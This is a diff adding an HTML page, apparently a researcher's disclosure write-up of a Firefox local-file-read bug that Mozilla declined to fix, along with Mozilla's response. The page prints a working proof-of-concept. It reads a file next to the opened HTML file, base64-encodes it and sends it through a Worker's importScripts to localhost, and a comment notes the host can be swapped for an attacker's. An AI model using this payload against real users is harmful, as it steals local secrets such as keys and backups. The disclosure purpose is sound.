@@ -1,0 +1,103 @@
+<!doctype html>
+<html>
+<head>
+	<title>FireFox Arbitrary Local File Disclosure (NO-FIX) - Abdulrahman Al-Qabandi</title>
+	<link href="../q.css" rel="stylesheet">
+	
+
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/>
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+</div>
+</div>
+
+
+
+<div id="qWriteup">
+<h1>FireFox Arbitrary Local File Disclosure (NO-FIX)</h1>
+<br>
+
+<p>One of the most serious browser exploits is the ability to read arbitrary files on the local disk. 
+The last Firefox bug which did this was found in the wild and it relied on a flaw within the PDF reader that comes with the Firefox browser (ref: <a href="https://blog.mozilla.org/security/2015/08/06/firefox-exploit-found-in-the-wild/" target="_blank">Firefox exploit found in the wild</a> )
+ this was a far more serious bug as it only required a victim to visit a web page.
+ <br>
+ The bug here, however, is a bit different as it requires the victim to open an HTML file locally and is limited to reading files in the same directory as the opened HTML file.<br>
+ 
+ Though my argument is that if the user downloads and saves the malicious HTML file in the downloads folder, then sensitive files such as SQL backups and AWS keys could be read and sent remotely almost instantly.<br>
+ This could be done with the following PoC code:<br><br></p>
+ <!-- HTML generated using hilite.me --><div class="qCode" style="overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">&lt;html&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;head&gt;</span>
+    <span style="color: #000080; font-weight: bold">&lt;title&gt;</span>Sensitive data disclosure PoC - @qab<span style="color: #000080; font-weight: bold">&lt;/title&gt;</span>
+    <span style="color: #000080; font-weight: bold">&lt;script </span><span style="color: #FF0000">type=</span><span style="color: #0000FF">&quot;application/javascript&quot;</span><span style="color: #000080; font-weight: bold">&gt;</span>
+	window.onload=$=&gt;{
+		<span style="color: #000080; font-weight: bold">var</span> doQ=(q)=&gt;{<span style="color: #008800; font-style: italic">//Simple XMLHttpRequest</span>
+			<span style="color: #000080; font-weight: bold">try</span>{
+			<span style="color: #000080; font-weight: bold">var</span> oReq = <span style="color: #000080; font-weight: bold">new</span> XMLHttpRequest();
+				oReq.addEventListener(<span style="color: #0000FF">&quot;load&quot;</span>, <span style="color: #000080; font-weight: bold">function</span>(e){console.dir(e)});
+				oReq.open(<span style="color: #0000FF">&quot;GET&quot;</span>, q,<span style="color: #000080; font-weight: bold">false</span>);
+				oReq.send();
+			setTimeout($=&gt;{
+					qSend(btoa(oReq.response));<span style="color: #008800; font-style: italic">//contents of local file are base64 encoded and sent</span>
+					qContents.value=oReq.response;	
+			},<span style="color: #0000FF">100</span>);
+			}<span style="color: #000080; font-weight: bold">catch</span>(e){alert(<span style="color: #0000FF">&#39;File not found or restricted.&#39;</span>)};
+		};
+		<span style="color: #000080; font-weight: bold">var</span> qSend=(q)=&gt;{
+				<span style="color: #000080; font-weight: bold">new</span> Worker(URL.createObjectURL(<span style="color: #000080; font-weight: bold">new</span> Blob([<span style="color: #0000FF">&#39;importScripts(&quot;http://localhost:777/&#39;</span>+q+<span style="color: #0000FF">&#39;&quot;)&#39;</span>])));<span style="color: #008800; font-style: italic">//This is the key, it will create a credentialed request to the remote host with the data</span>
+			<span style="color: #008800; font-style: italic">//localhost can be changed to an attacker controlled host and data may be collected that way (viewing request logs)</span>
+		};
+		qGo.onclick=(q)=&gt;{
+			doQ(qFile.value);
+		};
+	};
+    <span style="color: #000080; font-weight: bold">&lt;/script&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/head&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;h3&gt;</span>Please open console and view network activity before pressing &#39;Go&#39;<span style="color: #000080; font-weight: bold">&lt;/h3&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;input</span> <span style="color: #FF0000">type=</span><span style="color: #0000FF">&quot;input&quot;</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qFile&quot;</span> <span style="color: #FF0000">value=</span><span style="color: #0000FF">&quot;secret.txt&quot;</span><span style="color: #000080; font-weight: bold">/&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;input</span> <span style="color: #FF0000">type=</span><span style="color: #0000FF">&quot;button&quot;</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qGo&quot;</span> <span style="color: #FF0000">value=</span><span style="color: #0000FF">&quot;Go&quot;</span><span style="color: #000080; font-weight: bold">/&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;br&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;textarea</span> <span style="color: #FF0000">cols=</span><span style="color: #0000FF">100</span> <span style="color: #FF0000">rows=</span><span style="color: #0000FF">11</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&quot;qContents&quot;</span><span style="color: #000080; font-weight: bold">&gt;&lt;/textarea&gt;&lt;br&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;h3&gt;</span>There should be a request sent to an external website containing the base64 encoded contents of local file<span style="color: #000080; font-weight: bold">&lt;/h3&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/html&gt;</span>
+</pre></div><br>
+
+
+
+
+
+<p>
+In the above code a couple of things happen (after the user clicks 'Go' this was added to prevent the code from being automated and used maliciously):<br>
+<br>1. Using XMLHttpRequest we send a request to look for a local file named 'secret.txt' (in the same directory as the local HTML file) if found, we return its content else we alert an error.
+<br>2. If contents are read and file exists, we then base64 encode the data received then send a request to a remote server with the encoded data added. (check network activity to see it)<br>
+
+So we proved we can read a file and send it to a remote host without any problems. It is very easy to be able to iterate hundreds of filenames until we find a file we can read (since XMLHttpRequest throws error if file doesn't exist)<br><br>
+
+<h2>Mozilla's response</h2>
+
+There was some debate in the bugzilla report, initially this was marked 'sec-high' but was marked 'no-fix' after it was said that this is intended behavior by design.<br>
+In my opinion, even if its by design it does not excuse the fact its a security risk. Though I understand why its not being fixed, I believe there are too many people using this design behavior legitimately which meant that the benefit far outweighed the potential negatives from this.
+<br>
+<h2>References:</h2>
+<b>The Bugzilla report:</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1223992" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1223992</a> (Note: The report is still hidden due to me mentioning another bug within this report)
+
+
+</p>
+
+</div>
+<br>
+	<script type="application/javascript" src="../q.js">
+
+	
+	</script>
+</body>
+</html>
